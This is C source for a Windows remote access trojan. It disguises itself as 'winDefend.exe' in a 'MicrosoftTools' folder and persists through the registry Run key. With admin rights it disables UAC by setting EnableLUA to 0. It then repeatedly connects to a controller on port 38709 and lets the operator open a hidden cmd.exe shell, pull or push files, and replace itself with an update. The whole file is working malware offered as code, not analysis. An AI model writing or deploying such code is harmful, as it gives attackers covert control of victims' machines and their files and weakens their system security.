#include "helper.h"

#include <stdio.h>
#include <stdlib.h>

#include "eaSCKTBasicComProtocols.h"

#define MAIN_DIR     "MicrosoftTools"
#define PROGRAM_NAME L"winDefend.exe"

#define HOST "127.0.0.1"
#define PORT 38709

static bool switch_to_new_program;
static wchar_t pathWithName[260 + 1];

static bool mainProcessing(EAScktType sckt, char *msg);
static bool connectToCMD(EAScktType sckt);

bool isThePlaceToBe(const char *pathOfProgram)
{
    return NULL != strstr(pathOfProgram, MAIN_DIR);
}

bool isTheSystemInfected(void)
{
    wchar_t path[260 + 1];
    
    (void)snwprintf(path, 
                    sizeof(path), 
                    L"%S\\%s", 
                    _wgetenv(L"LOCALAPPDATA"), 
                    MAIN_DIR);

    DWORD dwAttr = GetFileAttributesW(path);
    
    return (dwAttr != 0xffffffff) && (dwAttr & FILE_ATTRIBUTE_DIRECTORY);
}

const wchar_t *infectTheSystem(void)
{
    HKEY hKey;
    wchar_t path[260 + 1];
    wchar_t pathOfProgram[260 + 1];
    
    (void)snwprintf(path, 
                    sizeof(path), 
                    L"%S\\%s", 
                    _wgetenv(L"LOCALAPPDATA"), 
                    MAIN_DIR);

    (void)CreateDirectoryW(path, NULL);

    (void)GetModuleFileNameW(NULL, pathOfProgram, (DWORD)sizeof(pathWithName));

    (void)snwprintf(pathWithName, 
                    sizeof(pathWithName), 
                    L"%S\\%S", 
                    path,
                    PROGRAM_NAME);

    (void)CopyFileW(pathOfProgram, pathWithName, 0);
    
    if (!RegOpenKeyExW(HKEY_CURRENT_USER, 
                       L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 
                       0, 
                       KEY_WRITE, 
                       &hKey))
    {
        (void)RegSetValueExW(hKey, 
                             PROGRAM_NAME, 
                             0, 
                             REG_SZ, 
                             (BYTE *)pathWithName, 
                             sizeof(pathWithName));
    }
    
    (void)RegCloseKey(hKey);

    // if the program is started without admin, lnRes will not be ERROR_SUCCESS
    if (!RegOpenKeyExA(HKEY_LOCAL_MACHINE, 
            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 
            0, 
            KEY_WRITE, 
            &hKey))
    {
        (void)RegSetValueExW(hKey, 
                             L"EnableLUA", 
                             0, 
                             REG_DWORD, 
                             (BYTE *)&((DWORD){0}), 
                             sizeof(DWORD));
    }
    
    (void)RegCloseKey(hKey);

    return pathWithName;
}

void startProgram(const wchar_t *programName)
{
    STARTUPINFOW si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));
    
    si.cb = sizeof(si);

    (void)CreateProcessW(programName,        // the path
                         NULL,               // Command line
                         NULL,               // Process handle not inheritable
                         NULL,               // Thread handle not inheritable
                         FALSE,              // Set handle inheritance to FALSE
                         CREATE_NEW_CONSOLE, // Opens file in a separate console
                         NULL,               // Use parent's environment block
                         NULL,               // Use parent's starting directory
                         &si,                // Pointer to STARTUPINFO
                         &pi                 // Pointer to PROCESS_INFORMATION
    );
    
    (void)CloseHandle(pi.hProcess);
    (void)CloseHandle(pi.hThread);
}

void connectToBigBrother(void)
{
    for (;;)
    {
        Sleep(1300);

        struct hostent *hstnt = gethostbyname(HOST);

        if (NULL == hstnt)
        {
            continue;
        }

        EAScktType sckt = socket(AF_INET, SOCK_STREAM, 0);

        if (SCKT_ERR == sckt)
        {
            continue;
        }
        
        struct in_addr **addr_list = (struct in_addr **)hstnt->h_addr_list;
        struct sockaddr_in inf = {
            .sin_family = AF_INET,
            .sin_port = htons(PORT),
            .sin_addr.s_addr = inet_addr(inet_ntoa(*addr_list[0])),
        };

        while (0 != connect(sckt, (struct  sockaddr *)&inf, sizeof(inf)))
        {
            Sleep(1300);
        }
        
        for (;;)
        {
            char text[313 + 1];

            if (false == recverText(sckt, text, sizeof(text)))
            {
                break;
            }

            bool loop = mainProcessing(sckt, text);

            if (false == loop)
            {
                break;
            }
        }

        closesocket(sckt);

        if (switch_to_new_program)
        {
            wchar_t path[260 + 1];
        
            (void)snwprintf(path, 
                            sizeof(path), 
                            L"%S\\%s\\%S", 
                            _wgetenv(L"LOCALAPPDATA"), 
                            MAIN_DIR,
                            PROGRAM_NAME);
            startProgram(path);

            break;
        }
    }
}

static bool mainProcessing(EAScktType sckt, char *text)
{
    if (!strncmp(text, "cmd", 3U))
    {
        if (false == connectToCMD(sckt))
        {
            return false;
        }
    }
    else if (!strncmp(text, "getFile ", 8U))
    {
        if (false == senderFile(sckt, text + 8))
        {
            return false;
        }
    }
    else if (!strncmp(text, "sendFile ", 9U))
    {
        if (false == recverFile(sckt))
        {
            return false;
        }
    }
    else if (!strncmp(text, "update", 6U))
    {
        wchar_t path[260 + 1];
        
        (void)snwprintf(path, 
                        sizeof(path), 
                        L"%S\\%s", 
                        _wgetenv(L"LOCALAPPDATA"), 
                        MAIN_DIR);
        (void)_wchdir(path);

        (void)remove("old.exe");

        (void)MoveFileW(PROGRAM_NAME, L"old.exe");

        if (false == recverFile(sckt))
        {
            (void)MoveFileW(L"old.exe", PROGRAM_NAME);

            return false;
        }

        switch_to_new_program = true;

        return false;
    }

    return true;
}

static bool connectToCMD(EAScktType sckt)
{
    CHAR chBuf[4500 + 1];
    DWORD dwRead, dwWritten;
    SECURITY_ATTRIBUTES saAttr;
    HANDLE hChildStd_IN_Rd = NULL, hChildStd_IN_Wr = NULL;
    HANDLE hChildStd_OUT_Rd = NULL, hChildStd_OUT_Wr = NULL;

    saAttr.bInheritHandle = TRUE;
    saAttr.lpSecurityDescriptor = NULL;
    saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);

    if (!CreatePipe(&hChildStd_OUT_Rd, &hChildStd_OUT_Wr, &saAttr, 0))
    {
        if (false == senderText(sckt, "_Error_ CreatePipe1"))
        {
            return false;
        }

        return true;
    }

    if (!CreatePipe(&hChildStd_IN_Rd, &hChildStd_IN_Wr, &saAttr, 0))
    {
        if (false == senderText(sckt, "_Error_ CreatePipe2"))
        {
            return false;
        }
        
        return true;
    }

    BOOL bSuccess = FALSE;
    STARTUPINFO siStartInfo;
    PROCESS_INFORMATION piProcInfo;

    ZeroMemory(&siStartInfo, sizeof(STARTUPINFO));
    ZeroMemory(&piProcInfo, sizeof(PROCESS_INFORMATION));

    siStartInfo.cb = sizeof(STARTUPINFO);
    siStartInfo.hStdInput = hChildStd_IN_Rd;
    siStartInfo.hStdError = hChildStd_OUT_Wr;
    siStartInfo.hStdOutput = hChildStd_OUT_Wr;
    siStartInfo.dwFlags |= STARTF_USESTDHANDLES;

    bSuccess = CreateProcessA("C:\\Windows\\System32\\cmd.exe", 
                              NULL,
                              NULL, 
                              NULL, 
                              TRUE,
                              CREATE_NO_WINDOW, // CREATE_NEW_CONSOLE
                              NULL, 
                              NULL, 
                              &siStartInfo, 
                              &piProcInfo);

    if (!bSuccess)
    {
        if (false == senderText(sckt, "_Error_ CreateProcessA"))
        {
            return false;
        }
        
        return true;
    }
    else
    {
        (void)CloseHandle(piProcInfo.hProcess);
        (void)CloseHandle(piProcInfo.hThread);
    }

    bool connection = true;

    for (;;)
    {
        Sleep(500); //TODO: pipe tam dolana kadar beklenmeli
        
        //TODO: pipe buf is bigger than 4101 again read, note: PeekNamedPipe
        bSuccess = ReadFile(hChildStd_OUT_Rd, chBuf, 4500, &dwRead, NULL);

        if (!bSuccess || dwRead == 0)
        {
            (void)WriteFile(hChildStd_IN_Wr, "exit\n", strlen("exit\n"), &dwWritten, NULL);
            
            if (false == senderText(sckt, "_Error_ WriteFile1"))
            {
                connection = false;
            }

            break;
        }

        chBuf[dwRead] = '\0';

        dwRead = 0U;

        for (DWORD idx = 0; chBuf[idx]; idx++)
        {
            if ('\n' == chBuf[idx])
            {
                dwRead = idx + 1U;

                break;
            }
        }

        senderText(sckt, &chBuf[dwRead]);

        if (false == recverText(sckt, chBuf, sizeof(chBuf)))
        {
            WriteFile(hChildStd_IN_Wr, "exit\n", strlen("exit\n"), &dwWritten, NULL);

            if (false == senderText(sckt, "_Error_ WriteFile2"))
            {
                connection = false;
            }

            break;
        }
        
        bSuccess = WriteFile(hChildStd_IN_Wr, chBuf, strlen(chBuf), &dwWritten, NULL);

        if (!bSuccess)
        {
            if (false == senderText(sckt, "_Error_ WriteFile3"))
            {
                connection = false;
            }

            break;
        }

        if (!strcmp(chBuf, "exit\n"))
        {
            break;
        }
    }

    CloseHandle(hChildStd_IN_Wr);
    CloseHandle(hChildStd_OUT_Rd);

    return connection;
}
